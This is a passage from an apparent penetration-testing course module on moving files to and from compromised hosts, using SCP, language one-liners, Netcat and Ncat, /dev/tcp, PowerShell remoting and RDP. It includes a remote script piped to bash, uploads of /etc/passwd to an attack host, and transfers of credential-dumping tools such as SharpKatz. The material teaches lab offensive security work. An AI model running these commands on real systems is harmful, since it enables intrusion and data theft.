+<span class="hljs-number">2022</span><span class="hljs-number">-05</span><span class="hljs-number">-20</span> <span class="hljs-number">08</span>:<span class="hljs-number">13</span>:<span class="hljs-number">05</span> (<span class="hljs-number">0.00</span> B<span class="hljs-regexp">/s) - ‘filetotransfer.txt’ saved [0/</span><span class="hljs-number">0</span>]
+</code></pre>
+<p>Note: When we start a new web server using Python or PHP, it's important to consider that inbound traffic may be blocked. We are transferring a file from our target onto our attack host, but we are not uploading the file.</p>
+<hr>
+<h3 id="scp-upload">SCP Upload</h3>
+<p>We may find some companies that allow the <code>SSH protocol</code> (TCP/22) for outbound connections, and if that's the case, we can use an SSH server with the <code>scp</code> utility to upload files. Let's attempt to upload a file to the target machine using the SSH protocol.</p>
+<p><strong>File Upload using SCP</strong></p>
+<pre><code class="lang-shell-session">root<span class="hljs-variable">@htb</span>[<span class="hljs-regexp">/htb]$ scp /etc</span><span class="hljs-regexp">/passwd htb-student@10.129.86.90:/home</span><span class="hljs-regexp">/htb-student/</span>
+
+htb-student<span class="hljs-variable">@10</span>.<span class="hljs-number">129.86</span>.<span class="hljs-number">90</span><span class="hljs-string">'s password: 
+passwd                                                                                                           100% 3414     6.7MB/s   00:00</span>
+</code></pre>
+<p>Note: Remember that scp syntax is similar to cp or copy.</p>
+<ol>
+<li>\
+Page 4</li>
+<li>Transferring Files with Code</li>
+</ol>
+<h2 id="transferring-files-with-code">Transferring Files with Code</h2>
+<hr>
+<p>It's common to find different programming languages installed on the machines we are targetting. Programming languages such as Python, PHP, Perl, and Ruby are commonly available in Linux distributions but can also be installed on Windows, although this is far less common.</p>
+<p>We can use some Windows default applications, such as <code>cscript</code> and <code>mshta</code>, to execute JavaScript or VBScript code. JavaScript can also run on Linux hosts.</p>
+<p>According to Wikipedia, there are around <a href="https://en.wikipedia.org/wiki/List\_of\_programming\_languages">700 programming languages</a>, and we can create code in any programing language, to download, upload or execute instructions to the OS. This section will provide a few examples using common programming languages.</p>
+<hr>
+<h3 id="python">Python</h3>
+<p>Python is a popular programming language. Currently, version 3 is supported, but we may find servers where Python version 2.7 still exists. <code>Python</code> can run one-liners from an operating system command line using the option <code>-c</code>. Let's see some examples:</p>
+<p><strong>Python 2 - Download</strong></p>
+<p>Transferring Files with Code</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ python2.7 -c 'import urllib;urllib.urlretrieve ("https:/</span><span class="hljs-regexp">/raw.githubusercontent.com/</span>rebootuser<span class="hljs-regexp">/LinEnum/</span>master/LinEnum.sh<span class="hljs-string">", "</span>LinEnum.sh<span class="hljs-string">")'</span>
+</code></pre>
+<p><strong>Python 3 - Download</strong></p>
+<p>Transferring Files with Code</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ python3 -c 'import urllib.request;urllib.request.urlretrieve("https:/</span><span class="hljs-regexp">/raw.githubusercontent.com/</span>rebootuser<span class="hljs-regexp">/LinEnum/</span>master/LinEnum.sh<span class="hljs-string">", "</span>LinEnum.sh<span class="hljs-string">")'</span>
+</code></pre>
+<hr>
+<h3 id="php">PHP</h3>
+<p><code>PHP</code> is also very prevalent and provides multiple file transfer methods. <a href="https://w3techs.com/technologies/details/pl-php">According to W3Techs' data</a>, PHP is used by 77.4% of all websites with a known server-side programming language. Although the information is not precise, and the number may be slightly lower, we will often encounter web services that use PHP when performing an offensive operation.</p>
+<p>Let's see some examples of downloading files using PHP.</p>
+<p>In the following example, we will use the PHP <a href="https://www.php.net/manual/en/function.file-get-contents.php">file_get_contents() module</a> to download content from a website combined with the <a href="https://www.php.net/manual/en/function.file-put-contents.php">file_put_contents() module</a> to save the file into a directory. <code>PHP</code> can be used to run one-liners from an operating system command line using the option <code>-r</code>.</p>
+<p><strong>PHP Download with File_get_contents()</strong></p>
+<p>Transferring Files with Code</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ php -r '$file = file_get_contents("https:/</span><span class="hljs-regexp">/raw.githubusercontent.com/</span>rebootuser<span class="hljs-regexp">/LinEnum/</span>master/LinEnum.sh<span class="hljs-string">"); file_put_contents("</span>LinEnum.sh<span class="hljs-string">",$file);'</span>
+</code></pre>
+<p>An alternative to <code>file_get_contents()</code> and <code>file_put_contents()</code> is the <a href="https://www.php.net/manual/en/function.fopen.php">fopen() module</a>. We can use this module to open a URL, read it's content and save it into a file.</p>
+<p><strong>PHP Download with Fopen()</strong></p>
+<p>Transferring Files with Code</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ php -r '<span class="hljs-keyword">const</span> BUFFER = 1024; <span class="hljs-variable">$fremote</span> = 
+fopen(<span class="hljs-string">"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"</span>, <span class="hljs-string">"rb"</span>); <span class="hljs-variable">$flocal</span> = fopen(<span class="hljs-string">"LinEnum.sh"</span>, <span class="hljs-string">"wb"</span>); <span class="hljs-keyword">while</span> (<span class="hljs-variable">$buffer</span> = fread(<span class="hljs-variable">$fremote</span>, BUFFER)) { fwrite(<span class="hljs-variable">$flocal</span>, <span class="hljs-variable">$buffer</span>); } fclose(<span class="hljs-variable">$flocal</span>); fclose(<span class="hljs-variable">$fremote</span>);'
+</code></pre>
+<hr>
+<p>We can also send the downloaded content to a pipe instead, similar to the fileless example we executed in the previous section using cURL and wget.</p>
+<p><strong>PHP Download a File and Pipe it to Bash</strong></p>
+<p>Transferring Files with Code</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ php -r '<span class="hljs-variable">$lines</span> = @<span class="hljs-keyword">file</span>(<span class="hljs-string">"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"</span>); <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$lines</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$line_num</span> =&gt; <span class="hljs-variable">$line</span>) { echo <span class="hljs-variable">$line</span>; }' | bash
+</code></pre>
+<p>Note: The URL can be used as a filename with the @file function if the fopen wrappers have been enabled.</p>
+<hr>
+<h3 id="other-languages">Other Languages</h3>
+<p><code>Ruby</code> and <code>Perl</code> are other popular languages that can also be used to transfer files. These two programming languages also support running one-liners from an operating system command line using the option <code>-e</code>.</p>
+<hr>
+<p><strong>Ruby - Download a File</strong></p>
+<p>Transferring Files with Code</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ ruby -<span class="hljs-keyword">e</span> 'require <span class="hljs-string">"net/http"</span>; <span class="hljs-keyword">File</span>.write(<span class="hljs-string">"LinEnum.sh"</span>, <span class="hljs-keyword">Net</span>::HTTP.<span class="hljs-built_in">get</span>(URI.<span class="hljs-keyword">parse</span>(<span class="hljs-string">"https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"</span>)))'
+</code></pre>
+<hr>
+<p><strong>Perl - Download a File</strong></p>
+<p>Transferring Files with Code</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ perl -e 'use LWP::Simple; getstore("https:/</span><span class="hljs-regexp">/raw.githubusercontent.com/</span>rebootuser<span class="hljs-regexp">/LinEnum/</span>master/LinEnum.sh<span class="hljs-string">", "</span>LinEnum.sh<span class="hljs-string">");'</span>
+</code></pre>
+<hr>
+<h3 id="javascript">JavaScript</h3>
+<p>JavaScript is a scripting or programming language that allows you to implement complex features on web pages. Like with other programming languages, we can use it for many different things.</p>
+<p>The following JavaScript code is based on <a href="https://superuser.com/questions/25538/how-to-download-files-from-command-line-in-windows-like-wget-or-curl/373068">this</a> post, and we can download a file using it. We'll create a file called <code>wget.js</code> and save the following content:</p>
+<p>Code: javascript</p>
+<pre><code class="lang-javascript">var WinHttpReq = new ActiveXObject(<span class="hljs-string">"WinHttp.WinHttpRequest.5.1"</span>);
+WinHttpReq.Open(<span class="hljs-string">"<span class="hljs-keyword">GET</span>"</span>, WScript.Arguments(<span class="hljs-number">0</span>), /*async=*/false);
+WinHttpReq.Send();
+BinStream = new ActiveXObject(<span class="hljs-string">"ADODB.Stream"</span>);
+BinStream.Type = <span class="hljs-number">1</span>;
+BinStream.Open();
+BinStream.Write(WinHttpReq.ResponseBody);
+BinStream.SaveToFile(WScript.Arguments(<span class="hljs-number">1</span>));
+</code></pre>
+<p>We can use the following command from a Windows command prompt or PowerShell terminal to execute our JavaScript code and download a file.</p>
+<p><strong>Download a File Using JavaScript and cscript.exe</strong></p>
+<p>Transferring Files with Code</p>
+<pre><code class="lang-cmd-session"><span class="hljs-string">C:</span>\htb&gt; cscript.exe <span class="hljs-regexp">/nologo wget.js https:/</span><span class="hljs-regexp">/raw.githubusercontent.com/</span>PowerShellMafia<span class="hljs-regexp">/PowerSploit/</span>dev<span class="hljs-regexp">/Recon/</span>PowerView.ps1 PowerView.ps1
+</code></pre>
+<hr>
+<h3 id="vbscript">VBScript</h3>
+<p><a href="https://en.wikipedia.org/wiki/VBScript">VBScript</a> ("Microsoft Visual Basic Scripting Edition") is an Active Scripting language developed by Microsoft that is modeled on Visual Basic. VBScript has been installed by default in every desktop release of Microsoft Windows since Windows 98.</p>
+<p>The following VBScript example can be used based on <a href="https://stackoverflow.com/questions/2973136/download-a-file-with-vbs">this</a>. We'll create a file called <code>wget.vbs</code> and save the following content:</p>
+<p>Code: vbscript</p>
+<pre><code class="lang-vbscript">dim xHttp: Set xHttp = createobject(<span class="hljs-string">"Microsoft.XMLHTTP"</span>)
+dim bStrm: Set bStrm = createobject(<span class="hljs-string">"Adodb.Stream"</span>)
+xHttp.Open <span class="hljs-string">"<span class="hljs-keyword">GET</span>"</span>, WScript.Arguments.Item(<span class="hljs-number">0</span>), False
+xHttp.Send
+
+with bStrm
+    .type = <span class="hljs-number">1</span>
+    .open
+    .write xHttp.responseBody
+    .savetofile WScript.Arguments.Item(<span class="hljs-number">1</span>), <span class="hljs-number">2</span>
+end with
+</code></pre>
+<p>We can use the following command from a Windows command prompt or PowerShell terminal to execute our VBScript code and download a file.</p>
+<p><strong>Download a File Using VBScript and cscript.exe</strong></p>
+<p>Transferring Files with Code</p>
+<pre><code class="lang-cmd-session"><span class="hljs-string">C:</span>\htb&gt; cscript.exe <span class="hljs-regexp">/nologo wget.vbs https:/</span><span class="hljs-regexp">/raw.githubusercontent.com/</span>PowerShellMafia<span class="hljs-regexp">/PowerSploit/</span>dev<span class="hljs-regexp">/Recon/</span>PowerView.ps1 PowerView2.ps1
+</code></pre>
+<hr>
+<h3 id="upload-operations-using-python3">Upload Operations using Python3</h3>
+<p>If we want to upload a file, we need to understand the functions in a particular programming language to perform the upload operation. The Python3 <a href="https://pypi.org/project/requests/">requests module</a> allows you to send HTTP requests (GET, POST, PUT, etc.) using Python. We can use the following code if we want to upload a file to our Python3 <a href="https://github.com/Densaugeo/uploadserver">uploadserver</a>.</p>
+<p><strong>Starting the Python uploadserver Module</strong></p>
+<p>Transferring Files with Code</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ python3 -m uploadserver 
+
+File upload available <span class="hljs-meta">at</span> /upload
+Serving HTTP on <span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span> port <span class="hljs-number">8000</span> (http://<span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>:<span class="hljs-number">8000</span>/) ...
+</code></pre>
+<p><strong>Uploading a File Using a Python One-liner</strong></p>
+<p>Transferring Files with Code</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ python3 -c 'import requests;requests.post("http:/</span><span class="hljs-regexp">/192.168.49.128:8000/</span>upload<span class="hljs-string">",files={"</span>files<span class="hljs-string">":open("</span><span class="hljs-regexp">/etc/</span>passwd<span class="hljs-string">","</span>rb<span class="hljs-string">")})'</span>
+</code></pre>
+<p>Let's divide this one-liner into multiple lines to understand each piece better.</p>
+<p>Code: python</p>
+<pre><code class="lang-python"><span class="hljs-comment"># To use the requests function, we need to import the module first.</span>
+<span class="hljs-built_in">import</span> requests 
+
+<span class="hljs-comment"># Define the target URL where we will upload the file.</span>
+<span class="hljs-attr">URL</span> = <span class="hljs-string">"http://192.168.49.128:8000/upload"</span>
+
+<span class="hljs-comment"># Define the file we want to read, open it and save it in a variable.</span>
+<span class="hljs-attr">file</span> = open(<span class="hljs-string">"/etc/passwd"</span>,<span class="hljs-string">"rb"</span>)
+
+<span class="hljs-comment"># Use a requests POST request to upload the file. </span>
+<span class="hljs-attr">r</span> = requests.post(url,<span class="hljs-attr">files={"files":file})</span>
+</code></pre>
+<p>We can do the same with any other programming language. A good practice is picking one and trying to build an upload program.</p>
+<h2 id="miscellaneous-file-transfer-methods">Miscellaneous File Transfer Methods</h2>
+<hr>
+<p>We've covered various methods for transferring files on Windows and Linux. We also covered ways to achieve the same goal using different programming languages, but there are still many more methods and applications that we can use.</p>
+<p>This section will cover alternative methods such as transferring files using <a href="https://en.wikipedia.org/wiki/Netcat">Netcat</a>, <a href="https://nmap.org/ncat/">Ncat</a> and using RDP and PowerShell sessions.</p>
+<hr>
+<h3 id="netcat">Netcat</h3>
+<p><a href="https://sectools.org/tool/netcat/">Netcat</a> (often abbreviated to <code>nc</code>) is a computer networking utility for reading from and writing to network connections using TCP or UDP, which means that we can use it for file transfer operations.</p>
+<p>The original Netcat was <a href="http://seclists.org/bugtraq/1995/Oct/0028.html">released</a> by Hobbit in 1995, but it hasn't been maintained despite its popularity. The flexibility and usefulness of this tool prompted the Nmap Project to produce <a href="https://nmap.org/ncat/">Ncat</a>, a modern reimplementation that supports SSL, IPv6, SOCKS and HTTP proxies, connection brokering, and more.</p>
+<p>In this section, we will use both the original Netcat and Ncat.</p>
+<p>Note: Ncat is used in HackTheBox's PwnBox as nc, ncat, and netcat.</p>
+<h3 id="file-transfer-with-netcat-and-ncat">File Transfer with Netcat and Ncat</h3>
+<p>The target or attacking machine can be used to initiate the connection, which is helpful if a firewall prevents access to the target. Let's create an example and transfer a tool to our target.</p>
+<p>In this example, we'll transfer <a href="https://github.com/Flangvik/SharpCollection/raw/master/NetFramework\_4.7\_x64/SharpKatz.exe">SharpKatz.exe</a> from our Pwnbox onto the compromised machine. We'll do it using two methods. Let's work through the first one.</p>
+<p>We'll first start Netcat (<code>nc</code>) on the compromised machine, listening with option <code>-l</code>, selecting the port to listen with the option <code>-p 8000</code>, and redirect the <a href="https://en.wikipedia.org/wiki/Standard\_streams#Standard\_input\_\(stdin\">stdout</a>) using a single greater-than <code>&gt;</code> followed by the filename, <code>SharpKatz.exe</code>.</p>
+<p><strong>NetCat - Compromised Machine - Listening on Port 8000</strong></p>
+<p>Miscellaneous File Transfer Methods</p>
+<pre><code class="lang-shell-session">victim<span class="hljs-variable">@target</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span><span class="hljs-comment"># Example using Original Netcat</span>
+victim<span class="hljs-variable">@target</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>nc -l -p <span class="hljs-number">8000</span> &gt; SharpKatz.exe
+</code></pre>
+<p>If the compromised machine is using Ncat, we'll need to specify <code>--recv-only</code> to close the connection once the file transfer is finished.</p>
+<p><strong>Ncat - Compromised Machine - Listening on Port 8000</strong></p>
+<p>Miscellaneous File Transfer Methods</p>
+<pre><code class="lang-shell-session">victim<span class="hljs-variable">@target</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span><span class="hljs-comment"># Example using Ncat</span>
+victim<span class="hljs-variable">@target</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>ncat -l -p <span class="hljs-number">8000</span> --recv-only &gt; SharpKatz.exe
+</code></pre>
+<p>From our attack host, we'll connect to the compromised machine on port 8000 using Netcat and send the file <a href="https://github.com/Flangvik/SharpCollection/raw/master/NetFramework\_4.7\_x64/SharpKatz.exe">SharpKatz.exe</a> as input to Netcat. The option <code>-q 0</code> will tell Netcat to close the connection once it finishes. That way, we'll know when the file transfer was completed.</p>
+<p><strong>Netcat - Attack Host - Sending File to Compromised machine</strong></p>
+<p>Miscellaneous File Transfer Methods</p>
+<pre><code class="lang-shell-session">root@htb[<span class="hljs-regexp">/htb]$ wget -q https:/</span>/github.com/Flangvik/SharpCollection/raw/master/NetFramework_4<span class="hljs-number">.7</span>_x64/SharpKatz.exe
+root@htb[/htb]$ <span class="hljs-comment"># Example using Original Netcat</span>
+root@htb[/htb]$ nc -q <span class="hljs-number">0</span> <span class="hljs-number">192.168</span><span class="hljs-number">.49</span><span class="hljs-number">.128</span> <span class="hljs-number">8000</span> &lt; SharpKatz.exe
+</code></pre>
+<p>By utilizing Ncat on our attacking host, we can opt for <code>--send-only</code> rather than <code>-q</code>. The <code>--send-only</code> flag, when used in both connect and listen modes, prompts Ncat to terminate once its input is exhausted. Typically, Ncat would continue running until the network connection is closed, as the remote side may transmit additional data. However, with <code>--send-only</code>, there is no need to anticipate further incoming information.</p>
+<p><strong>Ncat - Attack Host - Sending File to Compromised machine</strong></p>
+<p>Miscellaneous File Transfer Methods</p>
+<pre><code class="lang-shell-session">root<span class="hljs-symbol">@htb[</span>/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4<span class="hljs-number">.7</span>_x64/SharpKatz.exe
+root<span class="hljs-symbol">@htb[</span>/htb]$ <span class="hljs-meta"># Example using Ncat</span>
+root<span class="hljs-symbol">@htb[</span>/htb]$ ncat --<span class="hljs-built_in">send</span>-only <span class="hljs-number">192.168</span><span class="hljs-number">.49</span><span class="hljs-number">.128</span> <span class="hljs-number">8000</span> &lt; SharpKatz.exe
+</code></pre>
+<p>Instead of listening on our compromised machine, we can connect to a port on our attack host to perform the file transfer operation. This method is useful in scenarios where there's a firewall blocking inbound connections. Let's listen on port 443 on our Pwnbox and send the file <a href="https://github.com/Flangvik/SharpCollection/raw/master/NetFramework\_4.7\_x64/SharpKatz.exe">SharpKatz.exe</a> as input to Netcat.</p>
+<p><strong>Attack Host - Sending File as Input to Netcat</strong></p>
+<p>Miscellaneous File Transfer Methods</p>
+<pre><code class="lang-shell-session">root<span class="hljs-symbol">@htb[</span>/htb]$ <span class="hljs-meta"># Example using Original Netcat</span>
+root<span class="hljs-symbol">@htb[</span>/htb]$ sudo nc -l -p <span class="hljs-number">443</span> -q <span class="hljs-number">0</span> &lt; SharpKatz.exe
+</code></pre>
+<p><strong>Compromised Machine Connect to Netcat to Receive the File</strong></p>
+<p>Miscellaneous File Transfer Methods</p>
+<pre><code class="lang-shell-session">victim<span class="hljs-variable">@target</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span><span class="hljs-comment"># Example using Original Netcat</span>
+victim<span class="hljs-variable">@target</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>nc <span class="hljs-number">192.168</span>.<span class="hljs-number">49.128</span> <span class="hljs-number">443</span> &gt; SharpKatz.exe
+</code></pre>
+<p>Let's do the same with Ncat:</p>
+<p><strong>Attack Host - Sending File as Input to Ncat</strong></p>
+<p>Miscellaneous File Transfer Methods</p>
+<pre><code class="lang-shell-session">root<span class="hljs-symbol">@htb[</span>/htb]$ <span class="hljs-meta"># Example using Ncat</span>
+root<span class="hljs-symbol">@htb[</span>/htb]$ sudo ncat -l -p <span class="hljs-number">443</span> --<span class="hljs-built_in">send</span>-only &lt; SharpKatz.exe
+</code></pre>
+<p><strong>Compromised Machine Connect to Ncat to Receive the File</strong></p>
+<p>Miscellaneous File Transfer Methods</p>
+<pre><code class="lang-shell-session">victim<span class="hljs-variable">@target</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span><span class="hljs-comment"># Example using Ncat</span>
+victim<span class="hljs-variable">@target</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>ncat <span class="hljs-number">192.168</span>.<span class="hljs-number">49.128</span> <span class="hljs-number">443</span> --recv-only &gt; SharpKatz.exe
+</code></pre>
+<p>If we don't have Netcat or Ncat on our compromised machine, Bash supports read/write operations on a pseudo-device file <a href="https://tldp.org/LDP/abs/html/devref1.html">/dev/TCP/</a>.</p>
+<p>Writing to this particular file makes Bash open a TCP connection to <code>host:port</code>, and this feature may be used for file transfers.</p>
+<p><strong>NetCat - Sending File as Input to Netcat</strong></p>
+<p>Miscellaneous File Transfer Methods</p>
+<pre><code class="lang-shell-session">root<span class="hljs-symbol">@htb[</span>/htb]$ <span class="hljs-meta"># Example using Original Netcat</span>
+root<span class="hljs-symbol">@htb[</span>/htb]$ sudo nc -l -p <span class="hljs-number">443</span> -q <span class="hljs-number">0</span> &lt; SharpKatz.exe
+</code></pre>
+<p><strong>Ncat - Sending File as Input to Netcat</strong></p>
+<p>Miscellaneous File Transfer Methods</p>
+<pre><code class="lang-shell-session">root<span class="hljs-symbol">@htb[</span>/htb]$ <span class="hljs-meta"># Example using Ncat</span>
+root<span class="hljs-symbol">@htb[</span>/htb]$ sudo ncat -l -p <span class="hljs-number">443</span> --<span class="hljs-built_in">send</span>-only &lt; SharpKatz.exe
+</code></pre>
+<p><strong>Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File</strong></p>
+<p>Miscellaneous File Transfer Methods</p>
+<pre><code class="lang-shell-session">victim<span class="hljs-variable">@target</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>cat &lt; <span class="hljs-regexp">/dev/tcp</span><span class="hljs-regexp">/192.168.49.128/</span><span class="hljs-number">443</span> &gt; SharpKatz.exe
+</code></pre>
+<p>Note: The same operation can be used to transfer files from the compromised host to our Pwnbox.</p>
+<hr>
+<h3 id="powershell-session-file-transfer">PowerShell Session File Transfer</h3>
+<p>We already talk about doing file transfers with PowerShell, but there may be scenarios where HTTP, HTTPS, or SMB are unavailable. If that's the case, we can use <a href="https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2">PowerShell Remoting</a>, aka WinRM, to perform file transfer operations.</p>
+<p><a href="https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2">PowerShell Remoting</a> allows us to execute scripts or commands on a remote computer using PowerShell sessions. Administrators commonly use PowerShell Remoting to manage remote computers in a network, and we can also use it for file transfer operations. By default, enabling PowerShell remoting creates both an HTTP and an HTTPS listener. The listeners run on default ports TCP/5985 for HTTP and TCP/5986 for HTTPS.</p>
+<p>To create a PowerShell Remoting session on a remote computer, we will need administrative access, be a member of the <code>Remote Management Users</code> group, or have explicit permissions for PowerShell Remoting in the session configuration. Let's create an example and transfer a file from <code>DC01</code> to <code>DATABASE01</code> and vice versa.</p>
+<p>We have a session as <code>Administrator</code> in <code>DC01</code>, the user has administrative rights on <code>DATABASE01</code>, and PowerShell Remoting is enabled. Let's use Test-NetConnection to confirm we can connect to WinRM.</p>
+<p><strong>From DC01 - Confirm WinRM port TCP 5985 is Open on DATABASE01.</strong></p>
+<p>Miscellaneous File Transfer Methods</p>
+<pre><code class="lang-powershell-session">PS C:<span class="hljs-string">\htb&gt;</span> whoami
+
+htb<span class="hljs-string">\administrator</span>
+
+PS C:<span class="hljs-string">\htb&gt;</span> hostname
+
+DC01
+</code></pre>
+<p>Miscellaneous File Transfer Methods</p>
+<pre><code class="lang-powershell-session">PS <span class="hljs-string">C:</span>\htb&gt; Test-NetConnection -ComputerName DATABASE01 -Port <span class="hljs-number">5985</span>
+
+<span class="hljs-string">ComputerName     :</span> DATABASE01
+<span class="hljs-string">RemoteAddress    :</span> <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.101</span>
+<span class="hljs-string">RemotePort       :</span> <span class="hljs-number">5985</span>
+<span class="hljs-string">InterfaceAlias   :</span> Ethernet0
+<span class="hljs-string">SourceAddress    :</span> <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.100</span>
+<span class="hljs-string">TcpTestSucceeded :</span> True
+</code></pre>
+<p>Because this session already has privileges over <code>DATABASE01</code>, we don't need to specify credentials. In the example below, a session is created to the remote computer named <code>DATABASE01</code> and stores the results in the variable named <code>$Session</code>.</p>
+<p><strong>Create a PowerShell Remoting Session to DATABASE01</strong></p>
+<p>Miscellaneous File Transfer Methods</p>
+<pre><code class="lang-powershell-session">PS C:\htb&gt; <span class="hljs-built_in">$Session</span> = <span class="hljs-keyword">New</span>-PSSession -ComputerName DATABASE01
+</code></pre>
+<p>We can use the <code>Copy-Item</code> cmdlet to copy a file from our local machine <code>DC01</code> to the <code>DATABASE01</code> session we have <code>$Session</code> or vice versa.</p>
+<p><strong>Copy samplefile.txt from our Localhost to the DATABASE01 Session</strong></p>
+<p>Miscellaneous File Transfer Methods</p>
+<pre><code class="lang-powershell-session">PS <span class="hljs-keyword">C</span>:\htb&gt; Copy-<span class="hljs-keyword">Item</span> -<span class="hljs-keyword">Path</span> <span class="hljs-keyword">C</span>:\samplefile.txt -ToSession $Session -Destination <span class="hljs-keyword">C</span>:\Users\Administrator\Desktop\
+</code></pre>
+<p><strong>Copy DATABASE.txt from DATABASE01 Session to our Localhost</strong></p>
+<p>Miscellaneous File Transfer Methods</p>
+<pre><code class="lang-powershell-session">PS C:<span class="hljs-symbol">\h</span>tb&gt; Copy-Item -Path "C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\A</span>dministrator<span class="hljs-symbol">\D</span>esktop<span class="hljs-symbol">\D</span>ATABASE.txt" -Destination C:<span class="hljs-symbol">\ </span>-FromSession <span class="hljs-keyword">$Session</span>
+</code></pre>
+<hr>
+<h3 id="rdp">RDP</h3>
+<p>RDP (Remote Desktop Protocol) is commonly used in Windows networks for remote access. We can transfer files using RDP by copying and pasting. We can right-click and copy a file from the Windows machine we connect to and paste it into the RDP session.</p>
+<p>If we are connected from Linux, we can use <code>xfreerdp</code> or <code>rdesktop</code>. At the time of writing, <code>xfreerdp</code> and <code>rdesktop</code> allow copy from our target machine to the RDP session, but there may be scenarios where this may not work as expected.</p>
+<p>As an alternative to copy and paste, we can mount a local resource on the target RDP server. <code>rdesktop</code> or <code>xfreerdp</code> can be used to expose a local folder in the remote RDP session.</p>
+<p><strong>Mounting a Linux Folder Using rdesktop</strong></p>
+<p>Miscellaneous File Transfer Methods</p>
+<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ rdesktop <span class="hljs-number">10.10</span>.<span class="hljs-number">10.132</span> -d HTB -u administrator -p <span class="hljs-string">'Password0@'</span> -r disk:linux=<span class="hljs-string">'/home/user/rdesktop/files'</span>
+</code></pre>
+<p><strong>Mounting a Linux Folder Using xfreerdp</strong></p>
+<p>Miscellaneous File Transfer Methods</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ xfreerdp /</span><span class="hljs-string">v:</span><span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.132</span> <span class="hljs-regexp">/d:HTB /</span><span class="hljs-string">u:</span>administrator <span class="hljs-regexp">/p:'Password0@' /</span><span class="hljs-string">drive:</span>linux,<span class="hljs-regexp">/home/</span>plaintext<span class="hljs-regexp">/htb/</span>academy/filetransfer
+</code></pre>
+<p>To access the directory, we can connect to <code>\\tsclient\</code>, allowing us to transfer files to and from the RDP session.</p>
+<p><img src="storage\modules\24\tsclient.jpg" alt="image"></p>
+<p>Alternatively, from Windows, the native <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc">mstsc.exe</a> remote desktop client can be used.</p>
+<p><img src="storage\modules\24\rdp.png" alt="image"></p>
+<p>After selecting the drive, we can interact with it in the remote session that follows.</p>
+<p>Note: This drive is not accessible to any other users logged on to the target computer, even if they manage to hijack the RDP session.</p>
+<h2 id="protected-file-transfers">Protected File Transfers</h2>
+<hr>
+<p>As penetration testers, we often gain access to highly sensitive data such as user lists, credentials (i.e., downloading the NTDS.dit file for offline password cracking), and enumeration data that can contain critical information about the organization's network infrastructure, and Active Directory (AD) environment, etc. Therefore, it is essential to encrypt this data or use encrypted data connections such as SSH, SFTP, and HTTPS. However, sometimes these options are not available to us, and a different approach is required.</p>
+<p>Note: Unless specifically requested by a client, we do not recommend exfiltrating data such as Personally Identifiable Information (PII), financial data (i.e., credit card numbers), trade secrets, etc., from a client environment. Instead, if attempting to test Data Loss Prevention (DLP) controls/egress filtering protections, create a file with dummy data that mimics the data that the client is trying to protect.</p>
+<p>Therefore, encrypting the data or files before a transfer is often necessary to prevent the data from being read if intercepted in transit.</p>
+<p>Data leakage during a penetration test could have severe consequences for the penetration tester, their company, and the client. As information security professionals, we must act professionally and responsibly and take all measures to protect any data we encounter during an assessment.</p>
+<hr>
+<h3 id="file-encryption-on-windows">File Encryption on Windows</h3>
+<p>Many different methods can be used to encrypt files and information on Windows systems. One of the simplest methods is the <a href="https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions/Invoke-AESEncryption.ps1">Invoke-AESEncryption.ps1</a> PowerShell script. This script is small and provides encryption of files and strings.</p>
+<p><strong>Invoke-AESEncryption.ps1</strong></p>
+<p>Protected File Transfers</p>
+<pre><code class="lang-powershell-session">
+.EXAMPLE
+Invoke-AESEncryption -Mode Encrypt -Key <span class="hljs-string">"p@ssw0rd"</span> -Text <span class="hljs-string">"Secret Text"</span> 
+
+Description
+-----------
+Encrypts the string <span class="hljs-string">"Secret Test"</span> <span class="hljs-keyword">and</span> outputs a Base64 encoded ciphertext.
+
+.EXAMPLE
+Invoke-AESEncryption -Mode Decrypt -Key <span class="hljs-string">"p@ssw0rd"</span> -Text <span class="hljs-string">"LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs="</span>
+
+Description
+-----------
